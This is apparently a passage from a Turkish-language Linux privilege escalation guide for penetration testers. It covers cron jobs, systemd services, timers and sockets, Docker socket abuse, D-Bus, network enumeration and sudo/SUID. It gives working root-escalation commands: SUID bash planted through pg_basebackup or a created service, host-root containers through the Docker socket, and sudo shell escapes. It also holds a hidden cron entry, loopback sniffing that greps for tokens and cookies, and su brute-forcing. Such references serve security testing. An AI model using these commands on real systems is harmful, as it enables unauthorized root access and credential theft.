- `mkstemp()`: geçici dosyaları güvenli izinlerle atomik olarak oluşturur.

### Yazılabilir payload'lara sahip özel imzalı cron binary'leri
Root cron job'ı tarafından çalıştırılan tam binary'ye yazma izni olan sıradan bir kullanıcı, bir ayrıcalık sınırını aşabilir; ancak özel bir imza kontrolü, imzasız bir değişikliği reddedebilir. Belgelenen durumda root'a ait ELF dosyası `0760` modundaydı; bu, grubunun bir üyesinin dosyaya yazmasına, root sahibinin ise dosyayı çalıştırmasına izin veriyordu. Görünür bir süreç izi, job binary'yi çalıştırmadan önce `objcopy` aracının `.text_sig` bölümünü çıkardığını gösteriyordu; doğrulayıcı betiğin tamamı okunabilir değildi.<sup>[[2]](#references)</sup>

Başarılı olan değişiklik, sızdırılmış özel imzalama materyali kullanılarak bir ELF signer ile imzalanmıştı. [Biçim dokümantasyonu](https://github.com/NUAA-WatchDog/linux-elf-binary-signer), executable'ın `.text` bölümünden türetilen bir imza bölümünü açıklıyor. Yalnızca `.text_sig` bölümüne bir sertifika veya eşleşen bir metin eklemenin, görünmeyen doğrulayıcıyı geçirdiği gösterilmemiştir. Yazılabilir imzalı bir binary'nin istismar edilebilir olduğu sonucuna varmadan önce gerçek zamanlanmış yolu, etkin yazma erişimini, root tarafından çalıştırılmasını ve doğrulayıcı politikasını kontrol edin. `.text_sig` bölümü tek başına yalnızca incelenmesi gereken bir ipucudur.

### Sık çalışan cron job'ları

Her 1, 2 veya 5 dakikada bir çalıştırılan süreçleri bulmak için süreçleri izleyebilirsiniz. Belki bundan yararlanıp ayrıcalıklarınızı yükseltebilirsiniz.

Örneğin, **1 dakika boyunca her 0.1 saniyede bir izlemek**, **en az çalıştırılan komutlara göre sıralamak** ve en çok çalıştırılan komutları silmek için şunu yapabilirsiniz:

```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```

**Şunları da kullanabilirsiniz:** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (bu araç, başlayan her işlemi izler ve listeler).

### Saldırganın belirlediği mode bit'lerini koruyan root yedekleri (pg_basebackup)

Root yetkisiyle çalışan bir cron, yazma izniniz olan bir veritabanı dizininde `pg_basebackup` (veya herhangi bir özyinelemeli kopyalama işlemi) çalıştırıyorsa, **SUID/SGID binary** yerleştirerek bunun yedekleme çıktısına aynı mode bit'leriyle **root:root** olarak kopyalanmasını sağlayabilirsiniz.<sup>[[26]](#references)</sup>

Tipik keşif akışı (düşük yetkili bir DB kullanıcısı olarak):
- Her dakika `/usr/lib/postgresql/14/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/` gibi bir komut çalıştıran root cron'u tespit etmek için `pspy` kullanın.
- Kaynak cluster'ın (ör. `/var/lib/postgresql/14/main`) yazma izniniz dahilinde olduğunu ve iş çalıştıktan sonra hedefin (`/opt/backups/current`) root'a ait olduğunu doğrulayın.

Exploit:

```bash
# As the DB service user owning the cluster directory
cd /var/lib/postgresql/14/main
cp /bin/bash .
chmod 6777 bash

# Wait for the next root backup run (pg_basebackup preserves permissions)
ls -l /opt/backups/current/bash  # expect -rwsrwsrwx 1 root root ... bash
/opt/backups/current/bash -p    # root shell without dropping privileges
```

`pg_basebackup` küme kopyalanırken dosya modu bitlerini koruduğu için bu işe yarar; root tarafından çalıştırıldığında hedef dosyalar **root sahipliğini + saldırganın seçtiği SUID/SGID** izinlerini devralır. İzinleri koruyarak çalıştırılabilir bir konuma yazan benzer tüm ayrıcalıklı yedekleme/kopyalama rutinleri savunmasızdır.

### Görünmez cron işleri

Bir yorumdan sonra (satır sonu karakteri olmadan) **carriage return ekleyerek** bir cron işi oluşturmak mümkündür; cron işi yine de çalışır. Örnek (carriage return karakterine dikkat edin):

```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```

Bu tür gizli bir girişi tespit etmek için, kontrol karakterlerini görünür kılan araçlarla cron dosyalarını inceleyin:

```bash
cat -A /etc/crontab
cat -A /etc/cron.d/*
sed -n 'l' /etc/crontab /etc/cron.d/* 2>/dev/null
xxd /etc/crontab | head
```

## Hizmetler

### Yazılabilir _.service_ dosyaları

Herhangi bir `.service` dosyasına yazıp yazamadığınızı kontrol edin. Yazabiliyorsanız, hizmet başlatıldığında, yeniden başlatıldığında veya durdurulduğunda backdoor'unuzu **çalıştırması** için dosyayı **değiştirebilirsiniz** (makine yeniden başlatılana kadar beklemeniz gerekebilir).\
Örneğin, backdoor'unuzu .service dosyasının içine **`ExecStart=/tmp/script.sh`** ile ekleyin.

### Yazılabilir hizmet binary'leri

Hizmetler tarafından çalıştırılan binary'ler üzerinde **yazma izinleriniz** varsa, bunları backdoor'larla değiştirebilirsiniz. Böylece hizmetler yeniden çalıştırıldığında backdoor'lar da çalıştırılır.

### systemd PATH - Göreli Yollar

**systemd** tarafından kullanılan PATH'i şu komutla görebilirsiniz:

```bash
systemctl show-environment
```

Yol üzerindeki klasörlerden herhangi birine **yazabildiğinizi** fark ederseniz **yetkilerinizi yükseltebilirsiniz**. Şunlar gibi hizmet yapılandırma dosyalarında kullanılan **göreli yolları** aramanız gerekir:

```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```

Ardından, yazabileceğiniz systemd PATH klasörünün içine göreli yol ikilisiyle **aynı ada sahip** bir **executable** oluşturun. Servisten güvenlik açığı bulunan eylemi (**Start**, **Stop**, **Reload**) gerçekleştirmesi istendiğinde **backdoor**'unuz çalıştırılır (yetkisiz kullanıcılar genellikle servisleri başlatamaz/durduramaz, ancak `sudo -l` kullanıp kullanamayacağınızı kontrol edin).

**Servisler hakkında daha fazla bilgi için `man systemd.service` komutunu kullanın.**

## **Timers**

**Timers**, adları `**.timer**` ile biten; `**.service**` dosyalarını veya olayları kontrol eden systemd unit dosyalarıdır. **Timers**, takvim saatine dayalı olaylar ve monotonik zaman olayları için yerleşik desteğe sahip olduklarından cron'a alternatif olarak kullanılabilir ve eşzamansız çalıştırılabilirler.

Tüm timer'ları şu komutla listeleyebilirsiniz:

```bash
systemctl list-timers --all
```

### Yazılabilir zamanlayıcılar

Bir timer'ı değiştirebiliyorsanız, `systemd.unit` türlerinden bazılarını (örneğin `.service` veya `.target`) çalıştırmasını sağlayabilirsiniz.

```bash
Unit=backdoor.service
```

Dokümantasyonda Unit'in ne olduğunu okuyabilirsiniz:

> Bu timer sona erdiğinde etkinleştirilecek unit. Argüman, son eki ".timer" olmayan bir unit adıdır. Belirtilmezse, bu değer varsayılan olarak timer unit ile aynı ada sahip, son eki farklı olan bir service olur. (Yukarıya bakın.) Etkinleştirilen unit adı ile timer unit adı için son ek dışında aynı adın kullanılması önerilir.

Dolayısıyla, bu izni kötüye kullanmak için şunları yapmanız gerekir:

- **Yazılabilir bir binary çalıştıran** bir systemd unit (ör. bir `.service`) bulun.
- **Göreli bir path çalıştıran** bir systemd unit bulun ve bu yürütülebilir dosyayı taklit etmek için **systemd PATH** üzerinde **yazma ayrıcalıklarına** sahip olun.

**Timer'lar hakkında daha fazla bilgi için `man systemd.timer` komutunu kullanın.**

### **Timer'ı Etkinleştirme**

Bir timer'ı etkinleştirmek için root ayrıcalıklarına sahip olmanız ve şu komutu çalıştırmanız gerekir:

```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```

`/etc/systemd/system/<WantedBy_section>.wants/<name>.timer` konumunda bir symlink oluşturarak **timer**'ın **etkinleştirildiğini** unutmayın.

## Soketler

Unix Domain Sockets (UDS), istemci-sunucu modellerinde aynı veya farklı makinelerde **process communication** sağlar. Bilgisayarlar arası iletişim için standart Unix descriptor dosyalarını kullanır ve `.socket` dosyaları aracılığıyla yapılandırılır.<sup>[[14]](#references)</sup>

Soketler `.socket` dosyaları kullanılarak yapılandırılabilir.

**Soketler hakkında daha fazla bilgi için `man systemd.socket` komutunu kullanın.** Bu dosyada birkaç ilgi çekici parametre yapılandırılabilir:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Bu seçenekler farklıdır; ancak özetle soketin **nerede dinleme yapacağını belirtir** (AF_UNIX soket dosyasının yolu, dinlenecek IPv4/6 adresi ve/veya port numarası vb.).
- `Accept`: Boolean bir argüman alır. **true** ise, **gelen her bağlantı için bir service instance başlatılır** ve bu instance'a yalnızca bağlantı soketi aktarılır. **false** ise, dinleyen soketlerin tümü **başlatılan service unit'e aktarılır** ve tüm bağlantılar için yalnızca bir service unit başlatılır. Tek bir service unit'in koşulsuz olarak gelen tüm trafiği işlediği datagram soketleri ve FIFO'lar için bu değer yok sayılır. **Varsayılan değer false**. Performans nedenleriyle yeni daemon'ların yalnızca `Accept=no` için uygun olacak şekilde yazılması önerilir.
- `ExecStartPre`, `ExecStartPost`: Sırasıyla dinleyen **soketler**/FIFO'lar **oluşturulup bağlanmadan önce** veya **oluşturulup bağlandıktan sonra** yürütülen bir veya daha fazla komut satırı alır. Komut satırının ilk öğesi mutlak bir dosya adı olmalı, ardından process argümanları gelmelidir.
- `ExecStopPre`, `ExecStopPost`: Sırasıyla dinleyen **soketler**/FIFO'lar **kapatılıp kaldırılmadan önce** veya **kapatılıp kaldırıldıktan sonra** yürütülen ek **komutlardır**.
- `Service`: **Gelen trafik** durumunda **etkinleştirilecek** service unit adını belirtir. Bu ayara yalnızca `Accept=no` olan soketlerde izin verilir. Varsayılan olarak soketle aynı adı taşıyan service'e ayarlanır (son eki değiştirilir). Çoğu durumda bu seçeneği kullanmak gerekmez.

### Yazılabilir .socket dosyaları

**Yazılabilir** bir `.socket` dosyası bulursanız, `[Socket]` bölümünün başına `ExecStartPre=/home/kali/sys/backdoor` gibi bir satır **ekleyebilirsiniz**; böylece backdoor, soket oluşturulmadan önce yürütülür. Bu nedenle **muhtemelen makine yeniden başlatılana kadar beklemeniz gerekir.**\
_Sistemin bu soket dosyası yapılandırmasını kullanıyor olması gerekir; aksi takdirde backdoor yürütülmez._

### Soket aktivasyonu + yazılabilir unit yolu (eksik service oluşturma)

Yüksek etkili bir başka yanlış yapılandırma da şudur:

- `Accept=no` ve `Service=<name>.service` olan bir socket unit
- Başvurulan service unit mevcut değil
- Saldırgan `/etc/systemd/system` (veya başka bir unit arama yolu) içinde dosya yazabiliyor

Bu durumda saldırgan `<name>.service` dosyasını oluşturabilir, ardından systemd'nin yeni service'i root olarak yükleyip yürütmesi için sokete trafik gönderebilir.

İzlenecek adımlar:

```bash
systemctl cat vuln.socket
# [Socket]
# Accept=no
# Service=vuln.service
```

```bash
cat >/etc/systemd/system/vuln.service <<'EOF'
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /var/tmp/rootbash && chmod 4755 /var/tmp/rootbash'
EOF
nc -q0 127.0.0.1 9999
/var/tmp/rootbash -p
```

### Yazılabilir soketler

**Yazılabilir herhangi bir soket belirlediyseniz** (_burada Unix Sockets'ten bahsediyoruz, yapılandırma `.socket` dosyalarından değil_), bu soketle **iletişim kurabilir** ve belki bir zafiyeti exploit edebilirsiniz.

### Unix Sockets'i numaralandırma

```bash
netstat -a -p --unix
```

### Ham bağlantı

```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```

**Exploitation örneği:**


{{#ref}}
../../network-information/socket-command-injection.md
{{#endref}}

### HTTP soketleri

HTTP isteklerini dinleyen bazı **soketler** olabilir (_socket dosyalarından değil, Unix soketi görevi gören dosyalardan bahsediyorum_). Bunu şu komutla kontrol edebilirsiniz:

```bash
curl --max-time 2 --unix-socket /path/to/socket/file http://localhost/
```

Socket bir HTTP isteğiyle **yanıt veriyorsa**, onunla **iletişim kurabilir** ve belki bir **güvenlik açığını exploit edebilirsiniz**.

### Yazılabilir Docker Socket'i

Genellikle `/var/run/docker.sock` konumunda bulunan Docker socket'i, güvenliği sağlanması gereken kritik bir dosyadır. Varsayılan olarak `root` kullanıcısı ve `docker` grubunun üyeleri bu dosyaya yazabilir. Bu socket'e yazma erişimine sahip olmak, privilege escalation'a yol açabilir. Aşağıda bunun nasıl yapılabileceği ve Docker CLI kullanılamıyorsa uygulanabilecek alternatif yöntemler açıklanmaktadır.

#### **Docker CLI ile Privilege Escalation**

Docker socket'ine yazma erişiminiz varsa, aşağıdaki komutları kullanarak privilege escalation gerçekleştirebilirsiniz:<sup>[[15]](#references)</sup>

```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```

Bu komutlar, ana makinenin dosya sistemine root düzeyinde erişimi olan bir container çalıştırmanıza olanak tanır.

#### **Docker API'sini Doğrudan Kullanma**

Docker CLI kullanılamadığında, Unix socket üzerinden ham HTTP kullanarak Docker socket'inden yine de yararlanılabilir. En güvenilir akış şöyledir:

- Ana makinenin root dizinini bind-mount eden, uzun süre çalışan bir yardımcı container oluşturun
- Container'ı başlatın
- Bu yardımcı container içinde bir `exec` örneği oluşturun
- `exec` örneğini başlatın ve çıktıyı API üzerinden geri okuyun

**Docker imajlarını listeleme**

```bash
curl --unix-socket /var/run/docker.sock http://localhost/images/json
```

**Bir yardımcı container oluşturun ve başlatın**

```bash
HELPER=helper

curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine:3.20","Cmd":["sleep","99999"],"HostConfig":{"Binds":["/:/host"]}}' \
  "http://localhost/v1.47/containers/create?name=${HELPER}"

curl --unix-socket /var/run/docker.sock \
  -X POST "http://localhost/v1.47/containers/${HELPER}/start"
```

**Bir exec örneği oluştur**

```bash
EXEC_ID=$(
  curl -s --unix-socket /var/run/docker.sock \
    -H "Content-Type: application/json" \
    -d '{"AttachStdout":true,"AttachStderr":true,"Tty":true,"Cmd":["sh","-lc","find /host/root -maxdepth 1 -type f"]}' \
    "http://localhost/v1.47/containers/${HELPER}/exec" \
  | tr -d '\n' \
  | sed -n 's/.*"Id":"\([^"]*\)".*/\1/p'
)
```

**exec örneğini başlatın ve çıktıyı okuyun**

```bash
curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Detach":false,"Tty":true}' \
  "http://localhost/v1.47/exec/${EXEC_ID}/start"
```

Bu yöntem genellikle `attach` komutunu `socat` veya `nc -U` ile elle çalıştırmaya kıyasla daha sağlamdır. `/:/host` ile bir yardımcı oluşturabildiğinizde, `/host/root/...` gibi dosyaları okumak, `/host/root/.ssh` altına SSH anahtarları eklemek veya host başlangıç dosyalarını değiştirmek için ek `exec` örnekleri kullanabilirsiniz.

### Diğerleri

`docker` grubunun **içinde olduğunuz** için docker socket üzerinde yazma izinleriniz varsa, [**yetki yükseltmek için daha fazla yönteminiz**](../../user-information/interesting-groups-linux-pe/index.html#docker-group) olduğunu unutmayın. [**Docker API bir portta dinliyorsa**, onu da ele geçirebilirsiniz](../../../network-services-pentesting/2375-pentesting-docker.md#compromising).

**Container'lardan kaçmanın veya yetki yükseltmek için container runtime'larını kötüye kullanmanın** daha fazla yolunu şurada inceleyin:


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## Containerd (ctr) yetki yükseltme

**`ctr`** komutunu kullanabildiğinizi fark ederseniz, **yetki yükseltmek için bu komutu kötüye kullanma olasılığınız** olduğundan aşağıdaki sayfayı okuyun:


{{#ref}}
../../containers-namespaces/containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** yetki yükseltme

**`runc`** komutunu kullanabildiğinizi fark ederseniz, **yetki yükseltmek için bu komutu kötüye kullanma olasılığınız** olduğundan aşağıdaki sayfayı okuyun:


{{#ref}}
../../containers-namespaces/runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus, uygulamaların verimli biçimde etkileşim kurmasını ve veri paylaşmasını sağlayan gelişmiş bir **süreçler arası iletişim (IPC) sistemidir**. Modern Linux sistemleri göz önünde bulundurularak tasarlanan bu sistem, farklı uygulama iletişim biçimleri için sağlam bir çerçeve sunar.<sup>[[16]](#references)</sup>

Sistem çok yönlüdür; süreçler arasında veri alışverişini kolaylaştıran temel IPC'yi, **geliştirilmiş UNIX domain socket'lerini** andıran bir biçimde destekler. Ayrıca olayların veya sinyallerin yayınlanmasına yardımcı olarak sistem bileşenleri arasında sorunsuz entegrasyon sağlar. Örneğin, gelen bir aramayı bildiren Bluetooth daemon'undan gelen sinyal, müzik çaların sesini kapatmasını sağlayarak kullanıcı deneyimini iyileştirebilir. D-Bus ayrıca uzak nesne sistemini destekleyerek uygulamalar arasındaki servis isteklerini ve yöntem çağrılarını basitleştirir, geleneksel olarak karmaşık olan süreçleri kolaylaştırır.

D-Bus, mesaj izinlerini (yöntem çağrıları, sinyal yayınları vb.) eşleşen politika kurallarının kümülatif etkisine göre yöneten bir **izin ver/engelle modeliyle** çalışır. Bu politikalar bus ile etkileşimleri belirler ve bu izinlerin kötüye kullanılmasıyla yetki yükseltmeye olanak sağlayabilir.

`/etc/dbus-1/system.d/wpa_supplicant.conf` içindeki böyle bir politikaya örnek verilmiştir. Bu politika, root kullanıcısının `fi.w1.wpa_supplicant1` nesnesine sahip olma, bu nesneye mesaj gönderme ve ondan mesaj alma izinlerini ayrıntılı olarak belirtir.

Kullanıcısı veya grubu belirtilmeyen politikalar herkese uygulanırken, "default" bağlam politikaları diğer belirli politikaların kapsamadığı herkese uygulanır.

```xml
<policy user="root">
    <allow own="fi.w1.wpa_supplicant1"/>
    <allow send_destination="fi.w1.wpa_supplicant1"/>
    <allow send_interface="fi.w1.wpa_supplicant1"/>
    <allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```

**D-Bus iletişimini nasıl enumerate edip exploit edeceğinizi burada öğrenin:**


{{#ref}}
../../processes-crontab-systemd-dbus/d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Ağ**

Ağda enumeration yapmak ve makinenin konumunu belirlemek her zaman ilginçtir.

### Genel enumeration

```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#NSS resolution order (hosts file vs DNS)
grep -E '^(hosts|networks):' /etc/nsswitch.conf
getent hosts localhost

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)
(ip -br addr || ip addr show)

#Routes and policy routing (pivot paths)
ip route
ip -6 route
ip rule
ip route get 1.1.1.1

#L2 neighbours
(arp -e || arp -a || ip neigh)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#L2 topology (VLANs/bridges/bonds)
ip -d link
bridge link 2>/dev/null

#Network namespaces (hidden interfaces/routes in containers)
ip netns list 2>/dev/null
ls /var/run/netns/ 2>/dev/null
nsenter --net=/proc/1/ns/net ip a 2>/dev/null

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#nftables and firewall wrappers (modern hosts)
sudo nft list ruleset 2>/dev/null
sudo nft list ruleset -a 2>/dev/null
sudo ufw status verbose 2>/dev/null
sudo firewall-cmd --state 2>/dev/null
sudo firewall-cmd --list-all 2>/dev/null

#Forwarding / asymmetric routing / conntrack state
sysctl net.ipv4.ip_forward net.ipv6.conf.all.forwarding net.ipv4.conf.all.rp_filter 2>/dev/null
sudo conntrack -L 2>/dev/null | head -n 20

#Files used by network services
lsof -i
```

Etkin bir `/etc/inetd.conf` girdisi GNU Inetutils `telnetd`'yi root olarak çalıştırıyorsa, port yalnızca loopback'e bağlı olsa bile yapılandırılmış binary sürümünü ve yerel listener'ı kontrol edin. GNU Inetutils 1.9.3 ile 2.7 arasındaki sürümlerde, istemcinin gönderdiği `USER` değerinin `login -f` komutuna iletildiği bir [telnet authentication bypass](https://seclists.org/oss-sec/2026/q1/89) güvenlik açığı vardı (CVE-2026-24061). Bir process veya sürüm dizgesi yalnızca bir göstergedir; sistemin açığa çıktığı sonucuna varmadan önce vendor patch durumunu ve çalışan gerçek daemon'ı doğrulayın. [Telnet guide](../../../network-services-pentesting/pentesting-telnet.md) daha fazla ayrıntı içerir.

### Outbound filtering için hızlı ilk inceleme

Host komut çalıştırabiliyor ancak callback'ler başarısız oluyorsa DNS, transport, proxy ve route filtrelemelerini hızla birbirinden ayırın:

```bash
# DNS over UDP and TCP (TCP fallback often survives UDP/53 filters)
dig +time=2 +tries=1 @1.1.1.1 google.com A
dig +tcp +time=2 +tries=1 @1.1.1.1 google.com A

# Common outbound ports
for p in 22 25 53 80 443 587 8080 8443; do nc -vz -w3 example.org "$p"; done

# Route/path clue for 443 filtering
sudo traceroute -T -p 443 example.org 2>/dev/null || true

# Proxy-enforced environments and remote-DNS SOCKS testing
env | grep -iE '^(http|https|ftp|all)_proxy|no_proxy'
curl --socks5-hostname <ip>:1080 https://ifconfig.me
```

### Açık portlar

Makineye erişmeden önce etkileşim kuramadığınız ağ hizmetlerinin çalışıp çalışmadığını her zaman kontrol edin:

```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
ss -tulpn
#Quick view of local bind addresses (great for hidden/isolated interfaces)
ss -tulpn | awk '{print $5}' | sort -u
```

Dinleyicileri bind hedeflerine göre sınıflandırın:

- `0.0.0.0` / `[::]`: tüm yerel arayüzlerde erişime açık.
- `127.0.0.1` / `::1`: yalnızca yerel erişime açık (tünel/forward için uygun adaylar).
- Belirli dahili IP’ler (örn. `10.x`, `172.16/12`, `192.168.x`, `fe80::`): genellikle yalnızca dahili segmentlerden erişilebilir.

### Yalnızca yerel servisleri inceleme iş akışı

Bir hostu ele geçirdiğinizde, `127.0.0.1` adresine bağlı servisler çoğu zaman ilk kez shell’inizden erişilebilir hâle gelir. Hızlı bir yerel iş akışı şöyledir:

```bash
# 1) Find local listeners
ss -tulnp

# 2) Discover open localhost TCP ports
nmap -Pn --open -p- 127.0.0.1

# 3) Fingerprint only discovered ports
nmap -Pn -sV -p <ports> 127.0.0.1

# 4) Manually interact / banner grab
nc 127.0.0.1 <port>
printf 'HELP\r\n' | nc 127.0.0.1 <port>
```

### Ağ tarayıcısı olarak LinPEAS (yalnızca ağ modu)

Yerel PE kontrollerinin yanı sıra linPEAS, odaklı bir ağ tarayıcısı olarak çalışabilir. `$PATH` içindeki kullanılabilir ikili dosyaları (genellikle `fping`, `ping`, `nc`, `ncat`) kullanır ve araç yüklemez.

```bash
# Auto-discover subnets + hosts + quick ports
./linpeas.sh -t

# Host discovery in CIDR
./linpeas.sh -d 10.10.10.0/24

# Host discovery + custom ports
./linpeas.sh -d 10.10.10.0/24 -p 22,80,443

# Scan one IP (default/common ports)
./linpeas.sh -i 10.10.10.20

# Scan one IP with selected ports
./linpeas.sh -i 10.10.10.20 -p 21,22,80,443
```

If `-t` olmadan `-d`, `-p` veya `-i` kullanırsanız linPEAS, saf bir ağ tarayıcısı olarak çalışır (ayrıcalık yükseltme kontrollerinin geri kalanını atlar).

### Sniffing

Trafiği sniffleyip sniffleyemediğinizi kontrol edin. Sniffleyebiliyorsanız bazı kimlik bilgilerini ele geçirebilirsiniz.

```
timeout 1 tcpdump
```

Hızlı pratik kontroller:

```bash
#Can I capture without full sudo?
which dumpcap && getcap "$(which dumpcap)"

#Find capture interfaces
tcpdump -D
ip -br addr
```

Loopback (`lo`), post-exploitation sırasında özellikle değerlidir; çünkü yalnızca dahili ağda kullanılabilen birçok servis token/cookie/credential bilgilerini burada açığa çıkarır:

```bash
sudo tcpdump -i lo -s 0 -A -n 'tcp port 80 or 8000 or 8080' \
  | egrep -i 'authorization:|cookie:|set-cookie:|x-api-key|bearer|token|csrf'
```

Şimdi yakala, sonra ayrıştır:

```bash
sudo tcpdump -i any -s 0 -n -w /tmp/capture.pcap
tshark -r /tmp/capture.pcap -Y http.request \
  -T fields -e frame.time -e ip.src -e http.host -e http.request.uri
```

## Kullanıcılar

### Genel Keşif

**Kim** olduğunuzu, hangi **ayrıcalıklara** sahip olduğunuzu, sistemlerde hangi **kullanıcıların** bulunduğunu, hangilerinin **login** olabildiğini ve hangilerinin **root ayrıcalıklarına** sahip olduğunu kontrol edin:

```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
who
w
#Only usernames
users
#Login history
last | tail
#Last log of each user
lastlog2 2>/dev/null || lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```

### Büyük UID

Bazı Linux sürümleri, **UID > INT_MAX** değerine sahip kullanıcıların ayrıcalık yükseltmesine olanak tanıyan bir hatadan etkilenmiştir. Daha fazla bilgi: [burada](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [burada](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) ve [burada](https://twitter.com/paragonsec/status/1071152249529884674).<sup>[[33]](#references)[[34]](#references)[[35]](#references)</sup>\
**Şunu kullanarak exploit edin:** **`systemd-run -t /bin/bash`**

### Gruplar

Root ayrıcalıkları kazandırabilecek bir **grubun üyesi olup olmadığınızı** kontrol edin:


{{#ref}}
../../user-information/interesting-groups-linux-pe/
{{#endref}}

### Pano

Panoda ilginç bir şey olup olmadığını kontrol edin (mümkünse)

```bash
if [ `which xclip 2>/dev/null` ]; then
    echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
    echo "Highlighted text: "`xclip -o 2>/dev/null`
  elif [ `which xsel 2>/dev/null` ]; then
    echo "Clipboard: "`xsel -ob 2>/dev/null`
    echo "Highlighted text: "`xsel -o 2>/dev/null`
  else echo "Not found xsel and xclip"
  fi
```

### Parola Politikası

```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```

### Bilinen parolalar

Ortamın **herhangi bir parolasını biliyorsanız**, bu parolayı kullanarak **her kullanıcı olarak oturum açmayı** deneyin.

### Su Brute

Çok fazla gürültü çıkarmayı sorun etmiyorsanız ve bilgisayarda `su` ile `timeout` ikili dosyaları varsa, [su-bruteforce](https://github.com/carlospolop/su-bruteforce) kullanarak kullanıcılar üzerinde brute-force deneyebilirsiniz.\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) de `-a` parametresiyle kullanıcılar üzerinde brute-force denemesi yapar.

## Yazılabilir PATH suistimalleri

### $PATH

**$PATH içindeki bir klasöre yazabildiğinizi** fark ederseniz, yazılabilir klasörün içine, farklı bir kullanıcı (ideal olarak root) tarafından çalıştırılacak ve $PATH'te yazılabilir klasörünüzden önce gelen bir klasörden yüklenmeyen bir komutun adını taşıyan **bir backdoor oluşturarak** ayrıcalıklarınızı yükseltebilirsiniz.

### SUDO ve SUID

Bir komutu sudo kullanarak çalıştırmanıza izin veriliyor olabilir veya komutun suid biti ayarlanmış olabilir. Şunu kullanarak kontrol edin:

```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```

Bazı **beklenmedik komutlar dosyaları okumanıza ve/veya yazmanıza, hatta bir komut çalıştırmanıza olanak tanır**.<sup>[[8]](#references)</sup> Örneğin:

```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```

### NOPASSWD

Sudo yapılandırması, bir kullanıcının parolayı bilmeden bazı komutları başka bir kullanıcının yetkileriyle çalıştırmasına izin verebilir.

```
$ sudo -l
User demo may run the following commands on crashlab:
    (root) NOPASSWD: /usr/bin/vim
```

Bu örnekte `demo` kullanıcısı `vim`'i `root` olarak çalıştırabilir; artık root dizinine bir SSH anahtarı ekleyerek veya `sh` çağırarak shell almak çok kolaydır.

```
sudo vim -c '!sh'
```

### sudo scriptinde tırnak içine alınmamış Bash karşılaştırması

Bash'te `[[ "$protected" == $candidate ]]` ifadesinin sağ tarafı bir pattern'dir. Root yetkileriyle çalışabilen bir sudo script'i `candidate` değerini çağıranın kontrolündeki bir dosyadan alıyorsa, `prefix*` gibi bir değer korunan bir dizenin başlangıcıyla eşleşebilir. Farklı başarı ve hata yolları, bir prefix oracle'ı ortaya çıkarabilir. Amaç birebir eşleşmeyse sağ tarafı tırnak içine alın (`[[ "$protected" == "$candidate" ]]`). Tırnak içine alınmamış bir karşılaştırmanın istismar edilebilir olduğu sonucuna varmadan önce gerçek sudo argümanlarını, girdinin kaynağını ve gözlemlenebilir dallanma davranışını inceleyin. [GNU Bash kılavuzu](https://www.gnu.org/software/bash/manual/html_node/Conditional-Constructs.html) bu pattern davranışını açıklar.

### sudo altında PrusaSlicer proje dosyaları

